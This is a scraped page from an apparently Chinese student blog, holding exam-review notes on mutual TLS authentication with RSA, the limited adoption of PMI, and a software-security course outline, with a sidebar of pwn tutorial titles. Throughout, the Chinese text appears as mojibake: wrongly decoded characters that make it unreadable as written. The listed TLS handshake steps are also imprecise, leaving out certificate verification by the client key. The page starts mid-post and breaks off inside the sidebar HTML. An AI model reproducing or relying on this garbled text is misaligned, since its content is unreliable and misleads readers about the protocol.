å…¶ä»–å‡è®¾Aå’ŒBå‡æ‹¥æœ‰ç”±å¯ä¿¡ç¬¬ä¸‰æ–¹CAç­¾å‘çš„è¯ä¹¦CerAå’ŒCerBï¼Œä»¥åŠå¯ä¿¡ç¬¬ä¸‰æ–¹CAçš„æ ¹è¯ä¹¦ã€‚è‹¥Aæƒ³è¦ä¸Bè¿›è¡ŒåŒå‘èº«ä»½é‰´åˆ«ï¼Œå¹¶è¿›è¡ŒåŠ å¯†é€šä¿¡ï¼Œè¯·è¯¦ç»†æè¿°Aã€Bå®Œæˆä¸Šè¿°éœ€æ±‚æ‰€éœ€çš„æ­¥éª¤ï¼Œä»¥RSAç®—æ³•ä¸ºä¾‹ã€‚


1.Aç»™Bå‘é€client hello,å¸¦æœ‰éšæœºæ•°ã€æ”¯æŒçš„åè®®ç‰ˆæœ¬ã€æ”¯æŒçš„ç®—æ³•åˆ—è¡¨
2.Bç»™Aå‘é€server hello,å¸¦æœ‰éšæœºæ•°,é€‰å®šåè®®ç‰ˆæœ¬å’Œç®—æ³•(RSA)
3.Bç»™Aå‘é€Bçš„è¯ä¹¦,å«æœ‰RSAå…¬é’¥
4.Aé€šè¿‡CAæ ¹è¯ä¹¦éªŒè¯Bçš„è¯ä¹¦
5.éªŒè¯é€šè¿‡åAé€‰å®š48å­—èŠ‚éšæœºæ•°,ç”¨Bçš„è¯ä¹¦å…¬é’¥åŠ å¯†åå‘ç»™B
6.Aå‘é€è‡ªå·±çš„è¯ä¹¦ç»™B
7.Bé€šè¿‡CAæ ¹è¯ä¹¦éªŒè¯Açš„è¯ä¹¦
8.åŒæ–¹è®¡ç®—é€šä¿¡éœ€è¦çš„å¯†é’¥ç­‰,å¼€å§‹åŠ å¯†é€šä¿¡
9.Aé€šçŸ¥Bå¯ç”¨åå•†å¥½çš„ç®—æ³•
10.Aç»“æŸ
11.Bé€šçŸ¥Aå¯ç”¨åå•†å¥½çš„ç®—æ³•
12.Bç»“æŸ
è¯·è°ƒç ”å’Œåˆ†æç›®å‰PMI(Privilege Management Infrastructure)æ²¡æœ‰å¤§è§„æ¨¡ä½¿ç”¨çš„åŸå› PMIï¼ˆPrivilege Management Infrastructureï¼‰æ˜¯ä¸€ç§ç”¨äºç®¡ç†è®¡ç®—æœºç³»ç»Ÿä¸­ç”¨æˆ·æƒé™çš„åŸºç¡€è®¾æ–½ã€‚å®ƒå¯ä»¥å¸®åŠ©ç»„ç»‡æ§åˆ¶å“ªäº›ç”¨æˆ·å¯ä»¥æ‰§è¡Œå“ªäº›æ“ä½œï¼Œä»è€Œæé«˜ç³»ç»Ÿçš„å®‰å…¨æ€§ã€‚ä½†æ˜¯ï¼Œç›®å‰ PMI è¿˜æ²¡æœ‰å¾—åˆ°å¤§è§„æ¨¡ä½¿ç”¨çš„åŸå› æ˜¯ï¼š

å®æ–½è¾ƒä¸ºå¤æ‚ï¼šPMI éœ€è¦åœ¨è®¡ç®—æœºç³»ç»Ÿä¸­éƒ¨ç½²å¤šä¸ªè½¯ä»¶ç»„ä»¶ï¼Œè¿™éœ€è¦è¾ƒé«˜çš„æŠ€æœ¯æ°´å¹³å’Œè¾ƒé•¿çš„æ—¶é—´ã€‚
å®æ–½æˆæœ¬è¾ƒé«˜ï¼šå®æ–½ PMI éœ€è¦è´­ä¹°è½¯ä»¶å’Œç¡¬ä»¶ï¼Œä»¥åŠè®­ç»ƒå‘˜å·¥ï¼Œè¿™ä¼šå¸¦æ¥è¾ƒé«˜çš„æˆæœ¬ã€‚
ç»´æŠ¤è¾ƒä¸ºå›°éš¾ï¼šPMI çš„è½¯ä»¶ç»„ä»¶ç¹å¤šï¼Œç»´æŠ¤èµ·æ¥è¾ƒä¸ºå›°éš¾ã€‚
ç¼ºä¹æ™®åŠæ€§ï¼šPMI ç›®å‰å¹¶æ²¡æœ‰å¾—åˆ°å¹¿æ³›çš„æ¥å—å’Œä½¿ç”¨ï¼Œå› æ­¤ç»„ç»‡å¯èƒ½æ¯”è¾ƒæ‹…å¿ƒé£é™©ã€‚

æ€»ä¹‹ï¼ŒPMI è¿˜æ²¡æœ‰å¾—åˆ°å¤§è§„æ¨¡ä½¿ç”¨çš„åŸå› æ˜¯å®æ–½è¾ƒä¸ºå¤æ‚ã€å®æ–½æˆæœ¬è¾ƒé«˜ã€ç»´æŠ¤è¾ƒä¸ºå›°éš¾å’Œç¼ºä¹æ™®åŠæ€§ç­‰ã€‚
</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/" title="ucas-è½¯ä»¶å®‰å…¨åŸç†-å¤ä¹ ">ucas-è½¯ä»¶å®‰å…¨åŸç†-å¤ä¹ </a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">å‘è¡¨äº</span><time class="post-meta-date-created" datetime="2022-12-27T06:12:08.000Z" title="å‘è¡¨äº 2022-12-27 14:12:08">2022-12-27</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">æ›´æ–°äº</span><time class="post-meta-date-updated" datetime="2023-03-13T10:47:07.047Z" title="æ›´æ–°äº 2023-03-13 18:47:07">2023-03-13</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E7%A0%94%E7%A9%B6%E7%94%9F%E8%AF%BE%E7%A8%8B/">ç ”ç©¶ç”Ÿè¯¾ç¨‹</a></span></div><div class="content">æ ¹æ®*çš„æ•°é‡æ ‡è¯†é‡è¦ç¨‹åº¦,æœ€é«˜çº§ ***
ä¸€ã€è½¯ä»¶å®‰å…¨é‡æ–°è®¤è¯†è½¯ä»¶*è½¯ä»¶çš„é‡è¦æ€§:è½¯ä»¶æ˜¯æ„å»ºç½‘ç»œç©ºé—´çš„â€œæ°´æ³¥â€
è½¯ä»¶çš„æœ€æœ¬è´¨ç‰¹æ€§:å¯ç¼–ç¨‹(programmable)
è½¯ä»¶æ˜¯ä¸è´Ÿè´£ä»»çš„äº§å“           ä¸ºä»€ä¹ˆ??()
è½¯ä»¶å’Œç¨‹åºçš„å®šä¹‰

è½¯ä»¶æ˜¯ç”¨æˆ·ä¸ç¡¬ä»¶ä¹‹é—´çš„æ¥å£,ç”¨æˆ·é€šè¿‡è½¯ä»¶ä¸è®¡ç®—æœºäº¤æµ
è½¯ä»¶åŒ…æ‹¬ ç¨‹åºã€æ•°æ®å’Œæ–‡æ¡£
ç¨‹åºæ˜¯ä¸€ç»„é€šè¿‡è®¡ç®—æœºæ‰§è¡Œ,ä»¥å®Œæˆç‰¹å®šä»»åŠ¡çš„æŒ‡ä»¤
ç¨‹åºåŒ…æ‹¬ä»¥ä¸‹ç±»å‹: æºç¨‹åºã€æ±‡ç¼–ä»£ç ã€ç›®æ ‡ç¨‹åº
è½¯ä»¶ã€ç½‘ç»œç©ºé—´å®‰å…¨å‘å±•å†ç¨‹è¿™æ˜¯ä¸€æ¡çº¿,å®Œæ•´çš„å‘å±•è¿‡ç¨‹,æœªæ¥åšç ”ç©¶ç­‰,ä¹Ÿå¯ä»¥æŒ‰ç…§ç±»ä¼¼çš„æ–¹æ³•
ç¼–ç¨‹è¯­è¨€ã€æ“ä½œç³»ç»Ÿã€ä¸“ç”¨è½¯ä»¶çš„å‘å±•è·¯çº¿,åæ˜ äº†è¿™äº›å¹´è½¯ä»¶æŠ€æœ¯äº¤å å‘å±•çš„æ€åŠ¿
ä»€ä¹ˆæ˜¯è½¯ä»¶å®‰å…¨ ***è½¯ä»¶å®‰å…¨æ˜¯ç½‘ç»œç©ºé—´å®‰å…¨çš„é‡è¦éƒ¨åˆ†. ä¸»è¦ç ”ç©¶è½¯ä»¶çš„é˜²å¾¡æœºåˆ¶ä¸æŠ€æœ¯,è½¯ä»¶è„†å¼±æ€§åˆ†æä¸æ¼æ´åˆ©ç”¨æŠ€æœ¯,ç½‘ç»œç³»ç»Ÿç¯å¢ƒä¸­è½¯ä»¶çš„æ”»é˜²åšå¼ˆ,ä»¥åŠè½¯ä»¶å®‰å…¨æ€§çš„å·¥ç¨‹åŒ–ä¿éšœæ–¹æ³•.


ç™½å¸½ä¸é»‘å¸½ *é»‘å¸½å­(ç ´åæ–¹æ³•):ä¸æ”»å‡»ã€æ”»å‡»ç¨‹åºå’Œç ´è§£è½¯ä»¶ç›¸å…³çš„æ–¹æ³•
ç™½å¸½å­(å»ºè®¾æ–¹æ³•):ä¸è®¾è®¡ã€é˜²å¾¡å’ŒåŠŸèƒ½æ€§ç›¸å…³çš„æ–¹æ³•
è½¯ä»¶å®‰å…¨ä¸‰éƒ¨æ›² ***
è½¯ä»¶å®‰å…¨é˜²å¾¡:ä»â€ç™½å¸½â€œçš„è§†è§’,ç ”ç©¶è½¯ä»¶çš„å„ç±»é˜²å¾¡æœºåˆ¶
è½¯ä»¶å®‰å…¨åˆ†æå’Œåˆ©ç”¨:ä»â€é»‘å¸½â€œçš„è§†è§’,ç ”ç©¶è½¯ä»¶å­˜åœ¨çš„å„ç§å®‰å…¨è„†å¼±æ€§é—®é¢˜ä»¥åŠé«˜æ•ˆå‘ç°åŠåˆ©ç”¨æ–¹æ³•
å®‰å…¨çš„è½¯ä»¶å¼€å‘:ç¡®ä¿è½¯ä»¶å®‰å…¨çš„å·¥ç¨‹åŒ–æ–¹æ³•,BSIæ˜¯å…¶æ ¸å¿ƒæ€æƒ³,éœ€è¦è´¯å½»å§‹ç»ˆ
ä¸»å¸­ç½‘ç»œå®‰å…¨è§‚ **


ä¸€ã€å…³äºç½‘ç»œå®‰å…¨çš„å®šä½

â€‹	1.æ²¡æœ‰ç½‘ç»œå®‰å…¨å°±æ²¡æœ‰å›½å®¶å®‰å…¨
â€‹	2.ç½‘ç»œå®‰å…¨ä¸ºäººæ°‘,ç½‘ç»œå®‰å…¨é äººæ°‘

äºŒã€å…³äºå®‰å…¨å’Œå‘å±•çš„å…³ç³»

â€‹	1.ç½‘ç»œå®‰å…¨å’Œä¿¡æ¯åŒ–æ˜¯ä¸€ä½“ä¹‹ä¸¤ç¿¼,é©±åŠ¨ä¹‹åŒè½®
â€‹	2.ä»¥å®‰å…¨ä¿å‘å±•,ä»¥å‘å±•ä¿ƒå®‰å…¨

ä¸‰ã€å…³äºç½‘ç»œå®‰å…¨æ³•æ²»

â€‹	1.äº’è”ç½‘ä¸æ˜¯æ³•å¤–ä¹‹åœ°
â€‹	2.åšæŒä¾æ³•æ²»ç½‘ã€ä¾æ³•åŠç½‘ã€ä¾æ³•ä¸Šç½‘

å››ã€å…³äºç½‘ç»œç©ºé—´æŠ€æœ¯èƒ½åŠ›

â€‹	1.å¤§åŠ›å‘å±•æ ¸å¿ƒæŠ€æœ¯,åŠ å¼ºå…³é”®åŸºç¡€ä¿¡æ¯è®¾æ–½å®‰å…¨ä¿éšœ
â€‹	2.æœ€å…³é”®æœ€æ ¸å¿ƒçš„æŠ€æœ¯è¦ç«‹è¶³è‡ªä¸»åˆ›æ–°ã€è‡ªç«‹è‡ªå¼º

äº”ã€å…³äºç½‘ç»œå®‰å…¨äººæ‰å»ºè®¾

â€‹	1.ç½‘ç»œç©ºé—´çš„ç«äº‰,å½’æ ¹ç»“åº•æ˜¯äººæ‰çš„ç«äº‰
â€‹	2.å½¢æˆäººæ‰åŸ¹å…»,æŠ€æœ¯åˆ›æ–°,äº§ä¸šå‘å±•çš„è‰¯æ€§ç”Ÿæ€

å…­ã€å…³äºäº’è”ç½‘å›½é™…æ²»ç†

â€‹	1.å°Šé‡ç½‘ç»œä¸»æƒ,ç»´æŠ¤å’Œå¹³å®‰å…¨,ä¿ƒè¿›å¼€æ”¾åˆä½œ,æ„å»ºè‰¯å¥½ç§©åº
â€‹	2.æ„å»ºç½‘ç»œç©ºé—´å®‰å…¨å‘½è¿å…±åŒä½“

ã€Šç½‘ç»œä¿¡æ¯å®‰å…¨çš„çœŸç›¸ã€‹**
æœ¨æ¡¶åŸç†(å›½å¤–æ›´å€¾å‘äºå«é“¾æ¡åŸç†?): å®‰å…¨é˜²å¾¡ç³»ç»Ÿçš„å¼ºåº¦æ˜¯ç”±å…¶æœ€è–„å¼±ç¯èŠ‚çš„å¼ºåº¦å†³å®šçš„

PDRæ¨¡å‹:å®‰å…¨é˜²å¾¡æ˜¯ä¸€ä¸ªè¿‡ç¨‹,åŒ…å«é˜²æŠ¤-æ£€æµ‹-å“åº”ç­‰åŸºæœ¬ç¯èŠ‚

æ²¡æœ‰é“¶å¼¹:æ²¡æœ‰ä¸€ä¸ªå®é™…ç³»ç»Ÿæ˜¯æ— æ‡ˆå¯å‡»çš„,æ²¡æœ‰ä¸€é¡¹å®‰å…¨æŠ€æœ¯å¯ä»¥åŒ…æ²»ç™¾ç—…


è½¯ä»¶å®‰å…¨ä¸ç½‘ç»œå®‰å…¨çš„å…³ç³» **
ç½‘ç»œç©ºé—´å„ç§å„æ ·éƒ¨ä»¶çš„å¤§å¤šæ•°åŠŸèƒ½éƒ½æ˜¯é€šè¿‡è½¯ä»¶å®ç°çš„,å› æ­¤è½¯ä»¶æ¼æ´å°†ç›´æ¥å½±å“ç½‘ç»œç©ºé—´çš„å®‰å…¨

å›´ç»•è½¯ä»¶æ¼æ´,æ— è®ºæ˜¯æ”»å‡»è¿˜æ˜¯é˜²å¾¡,å®é™…ä¸Šéƒ½æ˜¯åœ¨ç½‘ç»œå±‚é¢å±•å¼€å¯¹æŠ—



è½¯ä»¶å®‰å…¨ç ”ç©¶è§†è§’æºä»£ç  æ±‡ç¼–ä»£ç  æœºå™¨ç 
è¦è´¯ç©¿äºè¿™å‡ ä¸ªå±‚æ¬¡æ¥ç»¼åˆåˆ†æ,æ‰ä¼šæ›´å¥½!

ç†è§£ç¨‹åºæ˜¯è½¯ä»¶å®‰å…¨æ”»é˜²çš„åŸºæœ¬åŠŸ
æŒæ¡ç¨‹åºçš„ç”Ÿæˆä¸è¿è¡ŒåŸç†æ˜¯ç†è§£ç¨‹åºçš„å‰æ

äºŒã€é€†å‘å·¥ç¨‹åŸºç¡€æ¦‚å¿µ å®šä¹‰ *é€†å‘å·¥ç¨‹:é€šè¿‡è§‚å¯Ÿç³»ç»ŸåŠå…¶è¡Œä¸º,å»ºç«‹å…¶ç»“æ„è“å›¾,ä»¥å¼„æ¸…å…¶è¿è¡Œè§„å¾‹çš„è¿‡ç¨‹
è½¯ä»¶é€†å‘å·¥ç¨‹: é’ˆå¯¹è½¯ä»¶çš„é€†å‘å·¥ç¨‹
ç›®æ ‡è½¯ä»¶&#x2F;ç¨‹åº: è¿ç”¨é€†å‘å·¥ç¨‹è¿›è¡Œåˆ†æçš„ç‰¹å®šè½¯ä»¶æˆ–ç¨‹åº
ç¨‹åºç¼–è¯‘è¿‡ç¨‹

ç¨‹åºçš„è¿è¡Œè¿‡ç¨‹ *æ ˆæ¡¢ä¸­å­˜æ”¾çš„ä¸œè¥¿


ä¸‰ç§é€†å‘æ–¹æ³•æ¯”è¾ƒ
é€†å‘å·¥ç¨‹çš„æ•Œæ‰‹
å›´ç»•é€†å‘åˆ†æçš„åšå¼ˆå¯¹æŠ— *
å…·ä½“çš„å†…å®¹å¦‚ä¸‹å›¾




ä¸‰ã€å®‰å…¨çš„è½¯ä»¶å¼€å‘(SDL) **

è½¯ä»¶å®‰å…¨é—®é¢˜çš„æ ¹æº *
è½¯ä»¶(å®‰å…¨)çš„ä¸‰å¤§é—®é¢˜:å¤æ‚æ€§ã€äº’è¿æ€§ã€å¯æ‰©å±•æ€§å¤æ‚æ€§:è½¯ä»¶çš„è§„æ¨¡å’Œå¤æ‚æ€§æ— èŠ‚åˆ¶å¢é•¿,å½±å“å› ç´ è¿˜æœ‰ä»£ç é›†æˆçš„ç´§å¯†ç¨‹åº¦,è¡¥ä¸ç­‰,ç¼–è¯‘è¿æ¥åçš„ä»£ç åº“ä¼šå˜å¤§
äº’è”æ€§:äº’è”ç½‘å¢åŠ äº†æ”»å‡»ç›®æ ‡çš„æ•°é‡,ç®€åŒ–äº†å®æ–½æ”»å‡»çš„æ–¹æ³•,é€šè¿‡ç½‘ç»œè®¿é—®ä¸éœ€è¦äººå·¥å¹²é¢„,å¾ˆå®¹æ˜“å¯åŠ¨,å½“å‰ä¼ä¸šä½“ç³»ç»“æ„åœ¨äº’è”ç¯å¢ƒä¸‹æš´éœ²å‡ºè¶Šæ¥è¶Šå¤šçš„å®‰å…¨éšæ‚£
å¯æ‰©å±•æ€§:å¯ä»¥é€šè¿‡æ’ä»¶ç­‰æ–¹å¼æä¾›é™„åŠ åŠŸèƒ½,å¯¼è‡´éš¾ä»¥é˜»æ­¢é€šè¿‡æ’ä»¶å¼•å…¥æ¼æ´
è½¯ä»¶å¼€å‘çš„ä¸‰å¤§é—®é¢˜:å¤æ‚æ€§ã€å¤ç”¨æ€§ã€åŠ£å¸æ•ˆåº”ä¸ºä»€ä¹ˆè½¯ä»¶æ˜¯ä¸è´Ÿè´£ä»»çš„? å¯ä»¥ä»è½¯ä»¶å¼€å‘çš„ä¸‰å¤§é—®é¢˜, åŠ£å¸æ•ˆåº”è¿™é‡Œå›ç­”
å› ä¸ºä¼—å¤šå¼€å‘å•†å¯¹å®‰å…¨ä»ç„¶ä¸å¤Ÿé‡è§†,æ›´åŠ é‡è§†çš„æ˜¯äº§å“çš„åŠŸèƒ½ä»¥åŠå¿«é€Ÿä¸Šçº¿,æŠ¢å å¸‚åœº. äºæ˜¯äº§ç”Ÿäº†åŠ£å¸æ’æ–¥è‰¯å¸çš„ç°è±¡.
å†…æ„å®‰å…¨(build security in &#x2F;BSI) **â€‹		å†…æ„å®‰å…¨æ˜¯ä¸€ç§ååŒåŒ–åŠªåŠ›,é€šè¿‡æä¾›å®è·µã€å·¥å…·ã€æŒ‡å—ã€è§„åˆ™ã€åŸåˆ™åŠå…¶ä»–èµ„æº,è®©è½¯ä»¶å¼€å‘è€…ã€æ¶æ„å¸ˆå’Œå®‰å…¨å‚ä¸äººå‘˜å¯ä»¥å€Ÿæ­¤åœ¨è½¯ä»¶å¼€å‘çš„æ¯ä¸ªé˜¶æ®µå°†å®‰å…¨æ„å»ºåˆ°è½¯ä»¶ä¸­å»

è½¯ä»¶å®‰å…¨ä¸‰å¤§æ”¯æŸ± **
æ”¯æŸ±ä¸€:é£é™©ç®¡ç† *
åœ¨æ•´ä¸ªSDLCä¸­,è¯†åˆ«ã€è¯„çº§ã€è¿½è¸ªé£é™©æ˜¯è½¯ä»¶é£é™©å®è·µçš„å…³é”®

å®‰å…¨æ¥è§¦ç‚¹æ˜¯ä¸ç‰¹å®šç±»å‹çš„RMFç»“åˆçš„æœ€ä½³å®è·µ. ä¸€æ—¦é’ˆå¯¹ç‰¹å®šè½¯ä»¶çš„å®‰å…¨æœ€ä½³å®è·µâ€œé”å®šâ€äº†ä¸€ç»„é£é™©,å°±ä¼šå¾—åˆ°é€‚å½“çš„å¤„ç†

æ²¡æœ‰ç™¾åˆ†ç™¾çš„å®‰å…¨.åªæœ‰é€šè¿‡å®æ–½é£é™©ç®¡ç†,å¹¶å……åˆ†è€ƒè™‘é‚£äº›å—å½±å“çš„å…³é”®å•†ä¸šä¿¡æ¯,æ‰èƒ½è®©è½¯ä»¶å®‰å…¨èµ°å‡ºâ€œæŠ€æœ¯ç‹å›½â€,ä¸ºå•†ä¸šå¸¦æ¥ä»·å€¼


æ”¯æŸ±äºŒ:å®‰å…¨æ¥è§¦ç‚¹ **è½¯ä»¶å®‰å…¨æ¥è§¦ç‚¹: åœ¨è½¯ä»¶å¼€å‘ç”Ÿå‘½å‘¨æœŸä¸­ä¿éšœè½¯ä»¶å®‰å…¨çš„ä¸€ç»„æœ€ä½³å®è·µ

è¿™äº›æ¥è§¦ç‚¹ä»é»‘å¸½å­(æ¸—é€å’Œæ”»å‡»)å’Œç™½å¸½å­(é˜²å¾¡å’Œä¿æŠ¤)ä¸¤ä¸ªæ–¹é¢ç»¼åˆè€ƒå¯Ÿè½¯ä»¶å¼€å‘ä¸­å¯èƒ½å‡ºç°çš„é—®é¢˜

ç»“åˆäº†æ¥è§¦ç‚¹çš„è½¯ä»¶å¼€å‘ç”Ÿå‘½å‘¨æœŸ(SDLC)å°±æˆä¸ºSDL,å¯åœ¨æ¯ä¸ªé˜¶æ®µå°½å¯èƒ½é¿å…å’Œæ¶ˆé™¤æ¼æ´,åŒæ—¶åˆä¿ç•™äº†ç†Ÿæ‚‰çš„å·¥ä½œæ–¹å¼

å®ƒæ˜¯è½¯ä»¶å®‰å…¨çš„ä¸‰å¤§æ”¯æŸ±çš„æ ¸å¿ƒ


æ”¯æŸ±ä¸‰:å®‰å…¨çŸ¥è¯† **



![image-20230103092233471](ucas-è½¯ä»¶å®‰å…¨åŸç†-å¤ä¹ &#x2F;image-202301030922 33471.png)
å®‰å…¨çŸ¥è¯†ä¸æ¥è§¦ç‚¹ **è®°ä½è¿™å¼ å›¾,å¹¶ä¼šè¿›è¡Œç›¸å…³çš„åˆ¤æ–­,ä¾‹å¦‚ æ¸—é€æµ‹è¯•æ˜¯ç”¨æ¥é’ˆå¯¹éœ€æ±‚å’Œä½¿ç”¨æ¡ˆä¾‹çš„å—? x

è½¯ä»¶å®‰å…¨çš„ç¼ºç‚¹(ç¼ºé™·å’Œç‘•ç–µ) *
ç¼ºç‚¹åˆ†ä¸ºäº†ç¼ºé™·å’Œç‘•ç–µ,éƒ½å¯ä»¥å¯¼è‡´æ¼æ´
åä¸ºã€å¾®è½¯ä¸ºä»€ä¹ˆè¦å®æ–½SDL

é’ˆå¯¹å®‰å…¨æ¥è§¦ç‚¹å’Œè½¯ä»¶å·¥ä»¶,å¯¹åº”å“ªä¸€éƒ¨åˆ†?





å››ã€è½¯ä»¶å…¨çƒä¾›åº”é“¾å®‰å…¨ *
â€‹		é—®åˆ°è½¯ä»¶ä¾›åº”é“¾å’Œå‰é¢è®²åˆ°çš„ä¸‰éƒ¨æ›²çš„è¿‡ç¨‹çš„å…³ç³»,
æ¡ˆä¾‹ *
äº”ã€æ“ä½œç³»ç»Ÿå®‰å…¨
åˆ†æ®µã€åˆ†é¡µ
æ®µä¿æŠ¤ã€é¡µä¿æŠ¤
å®å†…æ ¸ã€å¾®å†…æ ¸
å›ºä»¶
æ“ä½œç³»ç»Ÿè„†å¼±æ€§å’Œä¿æŠ¤æœºåˆ¶ *
å›´ç»•ç¼“å†²åŒºæº¢å‡ºå¯¹æŠ—çš„åšå¼ˆæ¼”è¿› **









å…­ã€æµè§ˆå™¨å®‰å…¨ B&#x2F;Sæµè§ˆå™¨å‚è€ƒæ¶æ„
åŒæºç­–ç•¥
æ”»å‡»é¢åˆ†æ *
ä¸ƒã€ç§»åŠ¨å®‰å…¨</div></div></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/page/6/#content-inner"><i class="fas fa-chevron-left fa-fw"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/#content-inner">6</a><span class="page-number current">7</span><a class="page-number" href="/page/8/#content-inner">8</a><a class="page-number" href="/page/9/#content-inner">9</a><a class="extend next" rel="next" href="/page/8/#content-inner"><i class="fas fa-chevron-right fa-fw"></i></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/profile.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">å”ä»”æ©™</div><div class="author-info__description">å–œæ¬¢æ¢ç´¢ä¸–ç•Œ,åœ¨è¯»ç ”ç©¶ç”Ÿ,è®¡ç®—æœºçˆ±å¥½è€…çš„æˆé•¿è®°å½•</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">82</div></a><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">15</div></a><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">13</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/tangzichengcc"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/tangzichengcc" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>å…¬å‘Š</span></div><div class="announcement_content">ä¼šè®°å½•è‡ªå·±çš„å­¦ä¹ ç»å†,ä»¥åŠä¸€äº›ç»å†,å¦‚æœæœ‰æƒ³æ³•æˆ–è€…ç–‘æƒ‘,æ¬¢è¿äº¤æµ!!</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>æœ€æ–°æ–‡ç« </span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/pwn%E5%85%A5%E9%97%A8-49-pwnable%E4%B9%8Bseethefile/" title="pwnå…¥é—¨-49-pwnableä¹‹seethefile"><img src="/img/background/1.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwnå…¥é—¨-49-pwnableä¹‹seethefile"/></a><div class="content"><a class="title" href="/pwn%E5%85%A5%E9%97%A8-49-pwnable%E4%B9%8Bseethefile/" title="pwnå…¥é—¨-49-pwnableä¹‹seethefile">pwnå…¥é—¨-49-pwnableä¹‹seethefile</a><time datetime="2024-01-28T14:31:00.000Z" title="å‘è¡¨äº 2024-01-28 22:31:00">2024-01-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/pwn%E5%85%A5%E9%97%A8-48-setcontext%E5%BA%94%E7%94%A8/" title="pwnå…¥é—¨-48-setcontextåº”ç”¨"><img src="/img/background/10.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwnå…¥é—¨-48-setcontextåº”ç”¨"/></a><div class="content"><a class="title" href="/pwn%E5%85%A5%E9%97%A8-48-setcontext%E5%BA%94%E7%94%A8/" title="pwnå…¥é—¨-48-setcontextåº”ç”¨">pwnå…¥é—¨-48-setcontextåº”ç”¨</a><time datetime="2024-01-27T15:28:41.000Z" title="å‘è¡¨äº 2024-01-27 23:28:41">2024-01-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/pwn%E5%85%A5%E9%97%A8-47-zh3R0CTF2021-moreprintf/" title="pwnå…¥é—¨-47-zh3R0CTF2021-moreprintf"><img src="/img/background/15.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwnå…¥é—¨-47-zh3R0CTF2021-moreprintf"/></a><div class="content"><a class="title" href="/pwn%E5%85%A5%E9%97%A8-47-zh3R0CTF2021-moreprintf/" title="pwnå…¥é—¨-47-zh3R0CTF2021-moreprintf">pwnå…¥é—¨-47-zh3R0CTF2021-moreprintf</a><time datetime="2023-11-12T15:40:29.000Z" title="å‘è¡¨äº 2023-11-12 23:40:29">2023-11-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/c%E8%AF%AD%E8%A8%80%E5%9B%9E%E7%82%89%E9%87%8D%E9%80%A0-unix%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3/" title="cè¯­è¨€å›ç‚‰é‡é€ -unixç³»ç»Ÿæ¥å£"><img src="/img/background/10.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="cè¯­è¨€å›ç‚‰é‡é€ -unixç³»ç»Ÿæ¥å£"/></a><div class="content"><a class="title" href="/c%E8%AF%AD%E8%A8%80%E5%9B%9E%E7%82%89%E9%87%8D%E9%80%A0-unix%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3/" title="cè¯­è¨€å›ç‚‰é‡é€ -unixç³»ç»Ÿæ¥å£">cè¯­è¨€å›ç‚‰é‡é€ -unixç³»ç»Ÿæ¥å£</a><time datetime="2023-11-12T07:29:52.000Z" title="å‘è¡¨äº 2023-11-12 15:29:52">2023-11-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/pwn%E5%85%A5%E9%97%A8-46-glibc%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95/" title="pwnå…¥é—¨-46-glibcæºç è°ƒè¯•"><img src="/img/background/4.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwnå…¥é—¨-46-glibcæºç è°ƒè¯•"/></a><div class="content"><a class="title" href="/pwn%E5%85%A5%E9%97%A8-46-glibc%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95/" title="pwnå…¥é—¨-46-glibcæºç è°ƒè¯•">pwnå…¥é—¨-46-glibcæºç è°ƒè¯•</a><time datetime="2023-11-06T13:01:36.000Z" title="å‘è¡¨äº 2023-11-06 21:01:36">2023-11-06</time></div></div></div></div><div class="card-widget card-categories"><div class="item-headline">
            <i class="fas fa-folder-open"></i>
            <span>åˆ†ç±»</span>
            <a class="card-more-btn" href="/categories/" title="æŸ¥çœ‹æ›´å¤š">
    <i class="fas fa-angle-right"></i></a>
            </div>
            <ul class="card-category-list" id="aside-cat-list">
            <li class="card-category-list-item "><a class="card-category-list-link" href="/categories/FUZZ/"><span class="card-category-list-name">FUZZ</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/IOT/"><span class="card-category-list-name">IOT</span><span class="card-category-list-count">3</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/PWN/"><span class="card-category-list-name">PWN</span><span class="card-category-list-count">53</span></a><ul class="card-category-list child"><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/PWN/%E8%99%9A%E6%8B%9F%E5%8C%96/"><span class="card-category-list-name">è™šæ‹ŸåŒ–</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" 